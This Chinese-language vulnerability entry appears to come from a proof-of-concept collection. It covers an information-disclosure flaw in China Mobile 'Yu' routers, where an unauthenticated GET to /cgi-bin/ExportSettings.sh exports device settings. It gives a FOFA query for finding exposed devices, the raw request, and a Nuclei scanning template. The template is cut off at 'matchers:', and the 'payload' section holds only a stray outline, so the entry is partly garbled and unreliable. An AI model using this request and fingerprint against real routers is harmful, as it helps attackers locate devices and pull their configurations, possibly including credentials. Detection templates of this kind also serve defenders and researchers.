# 中国移动禹路由ExportSettings.sh存在信息泄露漏洞

- **系统**：中国移动禹路由ExportSettings.sh　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`fofa：title="互联世界 物联未来-登录"`
- **请求**：`GET /cgi-bin/ExportSettings.sh HTTP/1.1`
- **关键头**：`Host: 127.0.0.1`　`Content-Length: 0`

**请求体 / payload**
```
+ 一、漏洞简介
+ 二、资产测绘
+ 三、漏洞复现
+ 四、Nuclei
---
```

**其他**
- Nuclei: ```http
id: ZYTT-ExportSettings-Info
info:
  name: 中移铁通禹路由器-信息泄露-ExportSettings
  author: haoguoguo
  severity: high
  metadata:
    fofa-query: title="互联世界 物联未来-登录"
variables:
  filename: "{{to_lower(rand_base(5))}}"
  boundary: "{{to_lower(rand_base(20))}}"
http:
  - raw:
      -
        GET /cgi-bin/ExportSettings.sh HTTP/1.1
        Host:{{Hostname}}
        Content-Length: 0
    matchers: